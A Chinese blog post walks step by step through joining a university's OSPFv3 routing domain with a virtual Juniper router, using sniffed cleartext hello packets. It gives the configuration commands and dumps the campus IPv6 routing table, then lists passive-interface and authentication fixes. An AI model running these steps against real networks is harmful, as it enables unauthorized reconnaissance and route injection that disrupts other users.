---
title:  X大 OSPFv3 入侵测试
date: 2016/7/3 08:36:46 
description: X大 OSPFv3 入侵测试
categories: 技术
tags: [ospf,network]
---

### 1.准备工作 ###
####  抓取OSPFv3 hello数据包 ####
计算机连接校园网，IPv4使用的是NAT模式，IPv6使用的是穿透模式。用WireShark抓去网卡的数据包，使用过滤器ospf，发现抓取到了OSPFv3的hello数据包，说明网络网络人员没有配置passive端口，在不必要的链路上禁止路由器发送hello数据包，点击其中的一个数据包，其结果如图1-1所示，竟然发现hello数据包为纯明文的。

<center>![](http://qingdao.icean.cc:11234/Imgbed/UCAS_OSPFv3_hacking/1-1.jpg)</center>
<center style="color:purple">**图1-1**</center>

从图1-1中可以看出路由器的router-id为2.2.2.29，区域ID为4，hello间隔为10，dead间隔为40。鉴于是明文的hello数据包，可以把主机伪装为路由器，来获取整个校园网OSPFv3协议的路由表。

####  所需软件 ####

- VirtualBox，运行模拟路由器的虚拟机，虚拟机使用的系统为Junipor，镜像下载地址请点击[这里](http://pan.baidu.com/s/1hrz9nTi)
- Named Pipe TCP Proxy，将虚拟机串口端命令行转化为TCP控制数据流，下载请点击[这里](http://pan.baidu.com/s/1o7tXKSE)。
- Xshell，连接虚拟机串口转化的TCP控制数据流

####  基础知识 ####
熟悉OSPF协议以及路由器配置流程

----------

### 2. 虚拟机配置###
####  导入虚拟机 ####
计算机上安装VirtualBox之后，点击下载的Junipor镜像，即可导入Junipor虚拟机。

####  配置网卡 ####
最多可以启动四张网卡，可以视为虚拟机Junipor路由器的四个接口，在本文中默认只启用了网卡一，网卡一使用桥接模式，桥接到可以抓取到OSPFv3 hello包的物理网卡。这样Junipor虚拟路由器也可以获取OSPFv3 hello数据包。网卡设置如图2-1所示。

<center>![](http://qingdao.icean.cc:11234/Imgbed/UCAS_OSPFv3_hacking/2-1.jpg)</center>
<center style="color:purple">**图2-1**</center>

####  配置串口 ####
虚拟机Junipor路由器无法通过ssh或者telnet直接连接，只能通过串口来进行交互和配置，因此需要配置串口，串口编号默认即可，端口模式选“主机管道”，路由和地址的格式为\\.\pip\xxxxx\xxxxxxxxxx，其串口设置如图2-2所示。

<center>![](http://qingdao.icean.cc:11234/Imgbed/UCAS_OSPFv3_hacking/2-2.jpg)</center>
<center style="color:purple">**图2-2**</center>

----------

### 3. 连接到虚拟机###
####  安装 Named Pipe TCP Proxy ####
到Named Pipe TCP Proxy 下载，并安装，在其安装目录找启动文件

####  添加管道配置 ####
到Named Pipe TCP Proxy目录下，运行piped.exe，管道地址与第二章中设置的路由和地址格式中相同，端口为自定义一个高端口号，例如8000以后的。

<center>![](http://qingdao.icean.cc:11234/Imgbed/UCAS_OSPFv3_hacking/3-1.jpg)</center>
<center style="color:purple">**图3-1**</center>

添加成功后，如图3-2所示，这样可以从本地使用shell应用telnet到该端口号，图3-2中telnet地址应为127.0.0.1:8001

<center>![](http://qingdao.icean.cc:11234/Imgbed/UCAS_OSPFv3_hacking/3-2.jpg)</center>
<center style="color:purple">**图3-2**</center>

####  telnet到Junipor虚拟机路由器 ####
启动Junipor路由器，启动成功后，使用xshell，配置如图3-3所示。连接成功后，如图3-4所示。

<center>![](http://qingdao.icean.cc:11234/Imgbed/UCAS_OSPFv3_hacking/3-3.jpg)</center>

<center style="color:purple">**图3-3**</center>
<center>![](http://qingdao.icean.cc:11234/Imgbed/UCAS_OSPFv3_hacking/3-4.jpg)</center>

<center style="color:purple">**图3-4**</center>

----------

### 4. Junipor基础配置 ###

第一设置时，输入cli进入运行模式

    root@% cli
    root>

输入configure进入配置模式

    root>configure
    root#

设置登录密码,至少字母加数字
​    
    root#edit system
    root#set host-name host
    root#set domain-name example.com
    root#set root-authentication plain-text-password

设置环回接口IPv4地址，用作OSPFv3协议中的router-id。

    root#set interfaces lo0 unit 0 family inet address 9.9.9.9/24

设置端口em0（eth0）的IPv6 eui-64地址，IPv6通告前缀可以到主机上查询，根据实际情况替换以下命令中的IPv6地址通告前缀，可以在运行模式下查看路由表来确认是否已经运行正常。

	root#set interfaces em0 unit 0 family inet6 address 2001:cc0:2020:4008::/64 eui-64 

启用OSPFv3协议，并把em0接口通告进入OSPFv3，区域ID根据前文抓取的hello数据包可以获知为4

	root#set protocols ospf3 area 0.0.0.4 interface em0 

根据抓取的hello明文数据包，来获悉学校路由器OSPFv3的hello time和dead time，若分别是10s和40s，则不用手动设置，若不为上述数值，则需要手动修改，修改命令如下

	root#set protocols ospf3 area 0.0.0.4 interface em0 hello-interval x
	root#set protocols ospf3 area 0.0.0.4 interface em0 dead-interval x

最后输入commit提交保存历史输入的命令

	root#commit

配置完毕后，可以在运行模式下，执行如下命令，来查看OSPFv3的状态，以及路由表

	root>show ospf3 neighbor
	root>show route

----------

### 5. 获取拓扑路由表###
执行完上述所有操作之后，在运行模式下，可以通过show route来查看整个学校拓扑的IPv6路由表，这时候可以路由条目并通告到OSPFv3中，整个拓扑中的路由器都会学习到该路由，由此可能造成对正常网络的影响。完整的IPv6路由表如下所示。

    ::/0   *[OSPF3/150] 00:01:56, metric 20, tag 0
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:1::/64
       *[OSPF3/10] 00:01:56, metric 3
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:1003::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:1004::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:1005::/64 
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:1006::/64
       *[OSPF3/150] 00:01:56, metric 20, tag 0
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:1007::/64
       *[OSPF3/150] 00:01:56, metric 20, tag 0
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:1008::/64
       *[OSPF3/150] 00:01:56, metric 20, tag 0
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:1010::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:1032::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:1033::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:1041::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:2000::/64
       *[OSPF3/150] 00:01:56, metric 20, tag 0
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:2010::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:2011::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:2012::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:2013::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:2014::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:2015::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:2016::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:2017::/64
       *[OSPF3/10] 00:01:56, metric 5
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:2018::/64
       *[OSPF3/10] 00:01:56, metric 5
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:2020::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:2021::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:2022::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:2030::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:3001::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:3002::/64 
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:3003::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4001::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4002::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4004::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4005::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4006::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4007::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4008::/64
       *[Direct/0] 00:02:14
    > via em1.0
    2001:cc0:2020:4008:a00:27ff:fe9b:28c7/128
       *[Local/0] 00:02:14
      Local via em1.0
    2001:cc0:2020:4009::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4010::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4012::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4013::/64
       *[OSPF3/150] 00:01:56, metric 20, tag 0
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4014::/64
       *[OSPF3/150] 00:01:56, metric 1, tag 0
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:1::/80
       *[OSPF3/10] 00:01:56, metric 3
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:2::/80
       *[OSPF3/10] 00:01:56, metric 3
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:3::/80
       *[OSPF3/10] 00:01:56, metric 3
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:4::/80
       *[OSPF3/10] 00:01:56, metric 3
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:5::/80
       *[OSPF3/10] 00:01:56, metric 3
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:6::/80
       *[OSPF3/10] 00:01:56, metric 3
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:7::/80
       *[OSPF3/10] 00:01:56, metric 3
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:8::/80
       *[OSPF3/10] 00:01:56, metric 3
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:9::/80   
       *[OSPF3/10] 00:01:56, metric 2
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:10::/80
       *[OSPF3/10] 00:01:56, metric 3
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:11::/80
       *[OSPF3/10] 00:01:56, metric 3
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:12::/80
       *[OSPF3/10] 00:01:56, metric 3
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:13::/80
       *[OSPF3/10] 00:01:56, metric 3
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:14::/80
       *[OSPF3/10] 00:01:56, metric 3
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:15::/80
       *[OSPF3/10] 00:01:56, metric 3
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:16::/80
       *[OSPF3/10] 00:01:56, metric 3
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:17::/80
       *[OSPF3/10] 00:01:56, metric 3
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:20::/80
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:21::/80
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:22::/80
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:23::/80
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:24::/80
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:25::/80
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:26::/80
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:27::/80
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4015:28::/80
       *[OSPF3/10] 00:01:56, metric 3
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4016::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4017::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4018::/64
       *[OSPF3/10] 00:01:56, metric 2
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4020::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4021::/64
       *[OSPF3/10] 00:01:56, metric 5
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4022::/64 
       *[OSPF3/10] 00:01:56, metric 5
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4023::/64
       *[OSPF3/10] 00:01:56, metric 5
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4024::/64
       *[OSPF3/10] 00:01:56, metric 5
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4025::/64
       *[OSPF3/10] 00:01:56, metric 5
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4026::/64
       *[OSPF3/10] 00:01:56, metric 5
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4027::/64
       *[OSPF3/10] 00:01:56, metric 5
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4028::/64
       *[OSPF3/10] 00:01:56, metric 5
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4029::/64
       *[OSPF3/10] 00:01:56, metric 5
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4030::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4049::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:4050::/64
       *[OSPF3/10] 00:01:56, metric 3
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:5001::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:5002::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0
    2001:cc0:2020:5005::/64
       *[OSPF3/10] 00:01:56, metric 4
    > to fe80::7625:8aff:fe0e:b250 via em1.0


查看OSPFv3邻居如下所示

    root@R3> show ospf3 neighbor 
    ID          Interface   State Pri   Dead
    2.2.2.29    em1.0       Full1       37
      Neighbor-address fe80::7625:8aff:fe0e:b250

----------

### 6. 改进措施###

- 在不必要的链路上，将OSPF端口设置为passive
- OSPF应配置链路认证，防止非法攻击者的入侵。


